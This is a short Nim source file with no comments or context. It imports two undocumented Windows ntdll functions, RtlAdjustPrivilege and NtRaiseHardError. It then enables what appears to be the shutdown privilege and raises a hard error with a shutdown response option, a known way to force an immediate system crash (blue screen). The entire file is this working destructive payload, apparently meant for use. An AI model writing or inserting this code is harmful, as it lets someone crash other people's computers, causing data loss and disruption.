proc RtlAdjustPrivilege(Privilege: int32, Enable: bool, CurrentThread: bool, Enabled: ptr bool): int32 {.stdcall, dynlib: "ntdll.dll", importc.}
proc NtRaiseHardError(ErrorStatus: uint32, NumberOfParameters: uint32, UnicodeStringParameterMask: uint32, Parameters: pointer, ValidResponseOptions: uint32, Response: ptr uint32): int32 {.stdcall, dynlib: "ntdll.dll", importc.}

var enabled: bool
var response: uint32

discard RtlAdjustPrivilege(19, true, false, addr enabled)
discard NtRaiseHardError(0xC0000420'u32, 0, 0, nil, 6, addr response)

